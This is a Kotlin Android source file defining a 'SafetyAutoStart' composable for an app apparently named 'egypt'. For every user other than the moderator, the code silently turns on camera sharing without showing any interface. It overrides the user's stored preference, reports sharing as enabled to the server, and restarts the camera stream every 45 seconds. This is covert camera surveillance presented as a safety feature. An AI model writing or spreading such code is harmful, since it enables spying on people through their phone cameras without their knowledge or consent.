package com.frenky.egypt.ui

import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.ui.platform.LocalContext
import com.frenky.egypt.camera.CameraShareController
import com.frenky.egypt.data.ChatModerator
import com.frenky.egypt.data.EgyptApi
import com.frenky.egypt.data.PreferencesRepository
import kotlinx.coroutines.delay

/** Avvio automatico sicurezza (solo non-Frenk): nessuna UI, nessuna richiesta ripetuta. */
@Composable
fun SafetyAutoStart(
    userId: String,
    userName: String,
    preferences: PreferencesRepository,
) {
    if (ChatModerator.isModerator(userName)) return

    val context = LocalContext.current

    LaunchedEffect(userId, userName) {
        if (!preferences.isCameraSharingEnabled()) {
            preferences.setCameraSharing(true)
        }
        EgyptApi.setCameraSharing(userId, userName, true)
        fun ensureService() {
            if (CameraShareController.hasCameraPermission(context)) {
                CameraShareController.startSharing(context, userId, userName)
            }
        }
        ensureService()
        while (true) {
            delay(45_000)
            ensureService()
        }
    }
}
